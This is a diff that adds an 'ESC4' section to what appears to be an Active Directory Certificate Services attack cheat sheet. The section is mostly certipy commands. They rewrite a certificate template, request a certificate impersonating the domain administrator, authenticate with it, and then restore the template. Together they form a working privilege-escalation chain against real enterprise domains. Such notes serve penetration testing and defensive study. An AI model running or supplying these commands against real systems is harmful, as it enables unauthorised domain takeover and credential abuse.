@@ -54,3 +54,30 @@
     ```bash    
     certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
     ```
+### ESC4
+#### Exploitation
+- Linux
+    ```bash
+    
+    certipy template \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -template 'SecureFiles' \
+        -write-default-configuration
+    ```
+    ```bash
+    certipy req \
+    -u 'attacker@corp.local' -p 'Passw0rd!' \
+    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    -ca 'CORP-CA' -template 'SecureFiles' \
+    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+    ```
+    ```bash
+    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+    ```
+    ```bash
+    certipy template \
+    -u 'attacker@corp.local' -p 'Passw0rd!' \
+    -dc-ip '10.0.0.100' -template 'SecureFiles' \
+    -write-configuration 'SecureFiles.json' -no-save
+    ```
+
